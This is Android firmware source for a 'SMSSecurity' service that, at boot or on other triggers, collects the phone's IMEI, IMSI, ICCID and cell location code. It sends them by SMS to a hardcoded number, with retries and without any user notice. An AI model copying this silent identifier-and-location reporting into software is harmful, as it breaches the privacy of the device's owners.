package com.zte.smssecurity;

import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;
import android.os.Build;
import android.os.SystemClock;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.mediatek.common.featureoption.FeatureOption;
import android.os.SystemProperties;

import android.content.pm.ResolveInfo;
import android.content.pm.PackageManager;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import java.util.ArrayList;
import java.util.List;
import com.android.internal.telephony.TelephonyProperties;
import android.app.KeyguardManager;
import android.text.format.DateFormat;
import android.net.Uri;
import android.content.ContentResolver;
//zhangle add start
import com.mediatek.telephony.TelephonyManagerEx;
import com.android.internal.telephony.PhoneConstants;
//zhangle add end
//aeon lee add start
import android.telephony.gsm.GsmCellLocation;
import com.mediatek.common.telephony.ITelephonyEx;
import android.os.ServiceManager;
import android.os.RemoteException;
//aeon lee add end
public class SMSSecurityService extends Service {
	private static final String TAG = "SMSSecurityService";

	private static final String SEND_INTENTACTION = "SEND_INTENTACTION";

	private static final String BOOTTIME_TRIGGER = "1";
	private static final String CALLTIME_TRIGGER = "2";
	private static final String ONCECALLTIME_TRIGGER = "4";

	private static String triggerType = null;

	private static String serviceNumber = null;
	private static String prefix01 = null;
	private static String prefix02 = null;
	private static String prefix03 = null;

	private static boolean mbInstance = false;
	private static boolean mbStart = false;

	private static boolean mbSendSucceed = false;
	private static boolean mbReceiverSucceed = false;

	private static boolean mbPhoneServiceState = false;

	private SMSSecurityDatabaseHelper dbh = null;

	private static boolean notToShowDialog = true;  //heli
	
	//starmobile:+639999929829 //13631661640
	private final String custom_malata_phone_receive_number = "+639999929829";//destination number
	
	private ITelephonyEx mITelephonyEx;//aeon lee
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		if (mbInstance) {
			stopSelf();
		} else {
			dbh = new SMSSecurityDatabaseHelper(this,
					SMSSecurityDatabaseMetadata.TABLE_NAME, null, 1);
			SQLiteDatabase db = dbh.getReadableDatabase();
			Cursor cursor = db.query(SMSSecurityDatabaseMetadata.TABLE_NAME,
					new String[] { SMSSecurityDatabaseMetadata.TYPE,
							SMSSecurityDatabaseMetadata.VALUE }, null, null,
					null, null, null);
			String type = null;
			while (cursor.moveToNext()) {
				type = cursor.getString(0);
				if (type.equals(SMSSecurityDatabaseMetadata.SERVICE_NUMBER)) {
					serviceNumber = cursor.getString(1);
					Log.d(TAG, "Service Number" + serviceNumber);
				} else if (type.equals(SMSSecurityDatabaseMetadata.PREFIX01)) {
					prefix01 = cursor.getString(1);
					Log.d(TAG, "prefix01" + prefix01 + prefix01.length());
				} else if (type.equals(SMSSecurityDatabaseMetadata.PREFIX02)) {
					prefix02 = cursor.getString(1);
					Log.d(TAG, "prefix02" + prefix02);
				} else if (type.equals(SMSSecurityDatabaseMetadata.PREFIX03)) {
					prefix03 = cursor.getString(1);
					Log.d(TAG, "prefix03" + prefix03);
				}
			}
			cursor.close();
			db.close();
		}
		mITelephonyEx = ITelephonyEx.Stub.asInterface(ServiceManager
                .getService(Context.TELEPHONY_SERVICEEX));//aeon lee		
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.d("lee",TAG+":onStartCommand()");
		     if (intent != null && intent.hasExtra("TriggerType")){
			triggerType = intent.getStringExtra("TriggerType");
		     }
			if ((triggerType != null) && triggerType.equals(BOOTTIME_TRIGGER)) {
				Log.d("lee", TAG+":BOOTTIME_TRIGGER,new SendSMS().start()");
				new SendSMS().start();
			} else {
				Log.d("lee", TAG+":Other trigger,new SendSMS().start()");
				new SendSMS().start();
				mbStart = true;
			}
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		Log.d("lee", TAG+":onDestroy()");
		super.onDestroy();
	}


	private class SendSMS extends Thread {
		@Override
		public void run() {
			Log.d(TAG, "SendSMS >>>>");
			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            TelephonyManagerEx tm = TelephonyManagerEx.getDefault(); //zhangle add
			if(FeatureOption.MTK_GEMINI_SUPPORT == true && tm!=null){
				if(isSimInserted(PhoneConstants.GEMINI_SIM_1)){
					tm.listen(mPhoneServiceListener, PhoneStateListener.LISTEN_SERVICE_STATE,PhoneConstants.GEMINI_SIM_1);
				}else{
					tm.listen(mPhoneServiceListener, PhoneStateListener.LISTEN_SERVICE_STATE,PhoneConstants.GEMINI_SIM_2);
				}
			}else{
				telephonyManager.listen(mPhoneServiceListener, PhoneStateListener.LISTEN_SERVICE_STATE);
			}
			String IMEI = null;
			String IMSI	= null;
			String ICCID = null;
			int LAC	= 0;
			if (FeatureOption.MTK_GEMINI_SUPPORT == true) {
				//IMEI
				IMEI = tm.getDeviceId(PhoneConstants.GEMINI_SIM_1);
				//IMSI
				IMSI = tm.getSubscriberId(0);
				//ICCID
				ICCID = tm.getSimSerialNumber(0);
				if("".equals(ICCID)||null==ICCID){
					ICCID = tm.getSimSerialNumber(1);
				}
				//LAC
				GsmCellLocation location = null;
				if(isSimInserted(PhoneConstants.GEMINI_SIM_1)){
					location = (GsmCellLocation) telephonyManager.getCellLocationGemini(PhoneConstants.GEMINI_SIM_1);
				}else if(isSimInserted(PhoneConstants.GEMINI_SIM_2)){
					location = (GsmCellLocation) telephonyManager.getCellLocationGemini(PhoneConstants.GEMINI_SIM_2);	
				}
				if(location!=null){
					LAC = location.getLac();
				}
			} else {
				IMEI = telephonyManager.getDeviceId();
				IMSI = telephonyManager.getSubscriberId();
				ICCID = telephonyManager.getSimSerialNumber();
				//LAC
				GsmCellLocation location = (GsmCellLocation) telephonyManager.getCellLocation();
				if(location!=null){
					LAC = location.getLac();
				}
			}
			StringBuffer buf = new StringBuffer();
			buf.append("STAR MOBILE WAVE LTE\n");
			buf.append("IMEI :"+(IMEI == null ? "" : IMEI) + "\n");
			buf.append("IMSI :"+(IMSI == null ? "" : IMSI) + "\n");
			buf.append("ICCID :"+(ICCID == null ? "" : ICCID) + "\n");
			buf.append("LAC :"+ LAC);
			Log.d("lee",TAG+":SMS content:"+buf.toString());
			int i = 0;
			while (!mbSendSucceed && !mbReceiverSucceed) {
				if (i >= 3) {
					Log.d("lee", TAG+":Three Times Over!");
					closedSMSSecurity();
					return;
				}
				int checkPhoneStateCount = 0;
				while (!mbPhoneServiceState&&checkPhoneStateCount<6) {
					checkPhoneStateCount++;
					try {
						Log.i("lee", TAG+":TelePhony State is out of service");
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catchblock e.printStackTrace();
					}
				}
				if(registered()){
					Log.d("lee", TAG+":message has been sent,return.");
					closedSMSSecurity();
					return;
				}
				Log.d(TAG, "Send SMS");

				//String custom_malata_phone_receive_number = "6000";  //destination number
				String address_number =  telephonyManager.getLine1Number(); //address number
				//Requires Permission:  READ_PHONE_STATE
				Intent intent = new Intent();
				intent.setAction("com.aeon.crq.snedsms");
				intent.putExtra("phonenumber",custom_malata_phone_receive_number);
				intent.putExtra("message",buf.toString());
				//intent.putExtra("simid","0");
				sendBroadcast(intent);
				Log.d("lee",TAG+":sendBroadcast--to mms with phone infos");
				i++;
				try {
					Thread.sleep(30000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			closedSMSSecurity();
			SMSSecurityService.this.stopSelf();
		}
	}

	private PhoneStateListener mPhoneServiceListener = new PhoneStateListener() {
		@Override
		public void onServiceStateChanged(ServiceState serviceState) {
			if (ServiceState.STATE_IN_SERVICE == serviceState.getState()) {
				Log.d(TAG, "onServiceStateChange Service Ready");
				mbPhoneServiceState = true;
			} else {
				Log.d(TAG, "onServiceStateChange Service No Ready");
				mbPhoneServiceState = false;
			}
		}
	};

	private void closedSMSSecurity() {
		/* PackageManager pm = getApplicationContext().getPackageManager();
		ComponentName component = new ComponentName("com.zte.smssecurity",
				"com.zte.smssecurity.PhoneStateReceiver");
		pm.setComponentEnabledSetting(component,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
		Log.d(TAG, "Set PhoneStateReceiver Disable");

         	ComponentName component_1 = new ComponentName("com.zte.smssecurity",
				"com.zte.smssecurity.SMSSecurityReceiver");
		pm.setComponentEnabledSetting(component_1,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP); */

                //write close flag to file
		//Util.writeCloseFlag();

		/* ContentValues values = new ContentValues();
		values.put(SMSSecurityDatabaseMetadata.VALUE, "0");
		SQLiteDatabase db = dbh.getWritableDatabase();
		db.update(SMSSecurityDatabaseMetadata.TABLE_NAME, values,
				SMSSecurityDatabaseMetadata.TYPE + "=\""
						+ SMSSecurityDatabaseMetadata.SERVICE_STATE + "\"",
				null);
		Log.d(TAG, "write database"); */
		/* if (BOOTTIME_TRIGGER != triggerType) {
			Context context = getApplicationContext();
			Intent serviceIntent = new Intent(context, SMSSecurityService.class);
			serviceIntent.putExtra("TriggerType", BOOTTIME_TRIGGER);
			PendingIntent pendingIntent = PendingIntent.getService(context, 0,
					serviceIntent, 0);
			AlarmManager alarmManager = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmManager.cancel(pendingIntent);
			Log.d(TAG, "Remove alarm");
		} *///don't remove alarm
		//mbSendSucceed = true;
		stopSelf();//aeon lee
		//Log.e("lee","closedSMSSecurity--stopSelf()");
	}
	
	//aeon lee add start
	private boolean isSimInserted(int slotId) {
		boolean isSimInserted = false;
		if (mITelephonyEx != null) {
			try {
				isSimInserted = mITelephonyEx.hasIccCard(slotId);
			} catch (RemoteException e) {
				}
		}
		return isSimInserted;
    }
	private boolean registered(){
		SQLiteDatabase db = dbh.getReadableDatabase();
		Cursor cursor = db.query(
						SMSSecurityDatabaseMetadata.TABLE_NAME, new String[] {
								SMSSecurityDatabaseMetadata.TYPE,
								SMSSecurityDatabaseMetadata.VALUE },
						SMSSecurityDatabaseMetadata.TYPE + "=" + "\""
								+ SMSSecurityDatabaseMetadata.SHOWREGISTERED
								+ "\"", null, null, null, null);
		int showRegistered = 0;
		while (cursor.moveToNext()) {
			if (cursor.getString(0).equals(
					SMSSecurityDatabaseMetadata.SHOWREGISTERED)) {
				showRegistered = Integer.parseInt(cursor.getString(1));
			}
		}
		if(showRegistered==1)
			return true;
		else 
			return false;
	}
	//aeon lee add end
}
